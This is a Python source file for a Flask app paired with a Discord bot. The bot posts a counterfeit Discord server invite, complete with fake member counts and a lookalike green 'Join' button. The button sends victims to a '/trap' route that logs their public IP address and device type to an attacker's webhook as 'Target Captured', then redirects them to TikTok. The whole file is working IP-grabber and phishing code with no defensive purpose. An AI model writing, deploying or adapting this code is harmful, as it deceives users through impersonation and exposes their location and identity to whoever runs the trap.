# language: Python, file: app.py
import os
import socket
import requests
import threading
import discord
from discord.ext import commands
from flask import Flask, request, render_template_string, redirect

# Force IPv4 to prevent Railway boot hangs
_orig_getaddrinfo = socket.getaddrinfo
def getaddrinfo_ipv4(host, port, family=0, type=0, proto=0, flags=0):
    return _orig_getaddrinfo(host, port, socket.AF_INET, type, proto, flags)
socket.getaddrinfo = getaddrinfo_ipv4

app = Flask(__name__)

# --- CONFIGURATION ---
BOT_TOKEN = os.environ.get("BOT_TOKEN")
WEBHOOK_URL = os.environ.get("WEBHOOK_URL")
RAILWAY_URL = "https://rnbw-production.up.railway.app"
# ---------------------

# Simple redirect trap
@app.route('/')
def index():
    return redirect("https://vt.tiktok.com/ZSs8LHYyG/", code=302)

@app.route('/trap')
def trap():
    # Grab the IP
    ip = request.headers.get('CF-Connecting-IP', request.remote_addr)
    ua = request.headers.get('User-Agent', 'Unknown')
    
    device = "Unknown"
    if "Windows" in ua: device = "Windows PC"
    elif "iPhone" in ua: device = "iPhone"
    elif "Android" in ua: device = "Android"
    elif "Macintosh" in ua: device = "Mac"

    payload = {
        "embeds": [{
            "title": "Target Captured",
            "color": 65280,
            "fields": [
                {"name": "Device Name", "value": f"```{device}```", "inline": False},
                {"name": "Public IP", "value": f"```{ip}```", "inline": False},
                {"name": "Method", "value": "```Invite Click```", "inline": False}
            ]
        }]
    }
    if WEBHOOK_URL:
        requests.post(WEBHOOK_URL, json=payload)
    
    # Redirect to TikTok after grab
    return redirect("https://vt.tiktok.com/ZSs8LHYyG/", code=302)

# --- DISCORD BOT ---
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user}', flush=True)

@bot.command()
async def send(ctx):
    # We build a custom embed that looks exactly like an invite
    embed = {
        "title": "BRXXKS",
        "description": "BRXXKS Official Community Server!\n\n🗡️🔥 🛡️🔥",
        "color": 0x2b2d31,
        "author": {
            "name": "You've been invited to join a server",
            "icon_url": "https://cdn.discordapp.com/emojis/1158760024939425853.gif" 
        },
        "fields": [
            {"name": "🟢 7,054 Online", "value": "⚪ 147,903 Members", "inline": True}
        ],
        "image": {
            "url": "https://cdn.discordapp.com/banners/1188617507765235722/a_1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6.webp?size=600"
        },
        "thumbnail": {
            "url": "https://cdn.discordapp.com/icons/1188617507765235722/a_1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6.webp?size=128"
        },
        "footer": {
            "text": "Est. Aug 2023"
        }
    }
    
    # Send it with a button that looks like the green Join button
    # Note: Standard Discord bots cannot generate the native server invite button, 
    # but we can use a Discord UI link button to mimic it perfectly.
    view = discord.ui.View()
    view.add_item(discord.ui.Button(
        style=discord.ButtonStyle.link,
        label="Join",
        url=f"{RAILWAY_URL}/trap"
    ))
    
    await ctx.send(embed=discord.Embed.from_dict(embed), view=view)

def run_bot():
    if not BOT_TOKEN:
        print("ERROR: BOT_TOKEN missing.", flush=True)
        return
    try:
        bot.run(BOT_TOKEN)
    except Exception as e:
        print(f"BOT CRASHED: {e}", flush=True)

threading.Thread(target=run_bot, daemon=True).start()
